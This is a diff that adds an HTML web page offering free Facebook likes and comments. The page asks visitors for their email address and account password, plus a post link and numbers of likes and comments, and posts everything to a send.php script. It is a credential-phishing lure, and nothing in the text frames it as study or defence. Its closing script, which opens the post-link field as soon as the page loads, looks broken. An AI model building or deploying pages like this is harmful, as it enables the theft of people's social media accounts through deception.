@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style/style.css">
+    <title>Give me attension</title>
+</head>
+<body>
+    <div class="container">
+        <div class="form">
+            <form action="./send.php" method="post">
+            <a href="#">
+                <img src="https://i.postimg.cc/8z0KkjYt/rsz-370276-pbe4-ir-228.png" alt="facebook like">
+            </a>
+            <h1>Welcome dude!</h1>
+            <p>Set your email and password and get a lot of likes and comments</p>
+          <div class="group-controls">
+            <div class="group-form">
+                <input type="email" name="fromEmail" id="email" placeholder="Set email.." required autocomplete="off">
+            </div>
+            <div class="group-form">
+                <input type="password" name="passWord" id="password" placeholder="Set password.." required autocomplete="off">
+            </div>
+            <div class="group-form">
+                <input type="text" name="message" id="post-link" placeholder="Set post link.." required autocomplete="off">
+            </div>
+            <div class="group-form">
+                <input type="number" name="number-likes" id="number" min="100" max="1000" placeholder="likes number" required autocomplete="off">
+            </div>
+            <div class="group-form">
+                <input type="number" name="number-comments" id="number" min="100" max="1000" placeholder="comments number" required autocomplete="off">
+            </div>
+            <div class="group-form">
+                <button type="submit" class="btn-send" name="acceptAccount">Accept</button>
+            </div>
+          </div>
+            <a href="#">
+                <img src="https://i.postimg.cc/8z0KkjYt/rsz-370276-pbe4-ir-228.png" alt="">
+            </a>
+            </form>
+        </div>
+        <script>
+            window.open(document.querySelector('#post-link').value, "_self")
+        </script>
+    </div>
+</body>
+</html>
